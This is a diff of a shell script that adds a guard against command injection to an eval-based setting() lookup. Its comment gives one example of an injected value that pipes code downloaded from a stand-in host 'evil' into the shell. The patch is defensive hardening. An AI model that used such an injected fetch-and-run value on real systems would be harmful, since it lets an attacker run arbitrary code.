@@ -36,6 +36,18 @@ dotenv_get() {
 setting() {
 	_name="$1"
 	_default="${2:-}"
+	# Reading a variable BY NAME is the one thing POSIX sh has no syntax for, so `eval` below is
+	# unavoidable - and it runs whatever it is handed: `setting 'X; curl evil|sh'` would execute
+	# that. Every caller passes a literal name today, so this guard changes no behaviour; it is
+	# what keeps a future caller from passing something off .env or off argv. `set -eu` at the top
+	# turns the failure into an aborted script rather than a silently empty value.
+	# See docs/internal/security-owasp-2026-09.md, finding A03-4.
+	case "$_name" in
+		"" | [0-9]* | *[!A-Za-z0-9_]*)
+			echo "error: setting() refuses a name that is not a shell identifier: $_name" >&2
+			exit 1
+			;;
+	esac
 	eval "_v=\${$_name:-}"
 	[ -n "$_v" ] || _v="$(dotenv_get "$_name")"
 	[ -n "$_v" ] || _v="$_default"
